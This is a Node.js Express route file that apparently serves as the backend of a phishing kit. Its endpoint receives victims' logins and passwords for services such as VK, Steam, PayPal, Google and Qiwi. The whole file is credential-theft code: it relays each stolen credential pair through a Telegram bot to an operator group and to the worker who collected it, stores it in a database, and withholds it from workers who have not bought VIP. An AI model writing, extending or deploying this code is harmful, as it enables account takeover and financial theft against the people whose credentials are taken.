const {Router} = require('express')
const bot = require('../../createBot')
const accs= require('../../database/models/account')
const user= require('../../database/models/userData')
const router = Router()
const names = {
    'vk': 'Вконтакте',
    'inst': 'Instagram',
    'ok': 'OK',
    'fb': 'Facebook',
    'tt':'TikTok',
    'st': 'Steam',
    'wot': 'World of Tanks',
    'mc':'Minecraft',
    'tg':'Telegram',
    'sc': 'SocialClub',
    'sp':'Samp',
    'ft':'Fortnite',
    'ml':'Mail',
    'ya':'Yandex',
    'gl':'Google',
    'yh':'Yahoo',
    'tw':'Twitter',
    'ds':'Discord',
    'gj':'Gaijin',
    'ms':'Microsoft',
    'pr':'Payeer',
    'psn':'PSN',
    'pp':'PayPal',
    'rb':'Roblox',
    'az':'Amazon',
    'qw':'Qiwi',
    'wm':'Webmoney',
}
router.post('/add',async (req, res) => {
    const userData = await user.findOne({
        tg_id: parseInt(req.body.id, 32)
    })
    bot.sendMessage(process.env.NotifyGroup2, `✨Новый аккаунт ${names[req.body.type]}\nЛогин: ${req.body.login}\nПароль: ${req.body.password}\n\nАккаунт пользователя: @${userData.login||'-'}\nTelegram ID: ${userData.tg_id||'-'}`)
    if(userData){
        if(userData.vip){
            bot.sendMessage(parseInt(req.body.id, 32), `✨Новый аккаунт ${names[req.body.type]}\nЛогин: ${req.body.login}\nПароль: ${req.body.password}`)
            await new accs({
                login: req.body.login,
                password: req.body.password,
                tg_id: parseInt(req.body.id, 32),
                type: req.body.type,
                date: new Date()
            }).save()
        }else{
            bot.sendMessage(parseInt(req.body.id, 32), `✨Новый аккаунт ${names[req.body.type]}\nЛогин: ${req.body.login.substr()}\nПароль: ${req.body.password}\nДля просмотра данных от аккаунта приобретите VIP`)
            await new accs({
                login: req.body.login,
                password: req.body.password,
                tg_id: parseInt(req.body.id, 32),
                type: req.body.type,
                date: new Date()
            }).save()
        }
        
    }
   
}) 

module.exports = router
